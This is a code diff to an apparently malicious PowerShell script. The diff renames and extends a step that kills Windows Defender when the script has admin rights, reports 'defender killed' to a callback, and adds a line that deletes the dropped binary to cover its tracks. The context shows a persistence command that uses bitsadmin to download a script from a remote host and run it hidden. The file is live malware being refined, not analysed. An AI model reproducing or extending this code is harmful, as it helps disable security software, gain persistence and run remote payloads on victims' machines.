@@ -88,6 +88,7 @@ function _runWait($n,$a,$s,$l,$sec){
         _log "$s : $l started, waiting ${sec}s"
         Start-Sleep $sec
         if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
+        _log "$s : $l done"
         _cb $s 'ok' "$l ok"
         return $true
     }catch{
@@ -130,11 +131,14 @@ if($cbIsAdmin){
         _log "S2: reg ok"
     }catch{}
 
-    _runWait 'update.exe' 'kill' 'S2' 'defkill' 12 | Out-Null
+    _runWait 'windefctl.exe' 'kill' 'S2' 'defkill' 18 | Out-Null
     _cb 'S2' 'ok' 'defender killed'
 }else{
     _cb 'S2' 'skip' 'no admin'
 }
+
+# cleanup windefctl binary
+Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null
 
 $persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
 try{
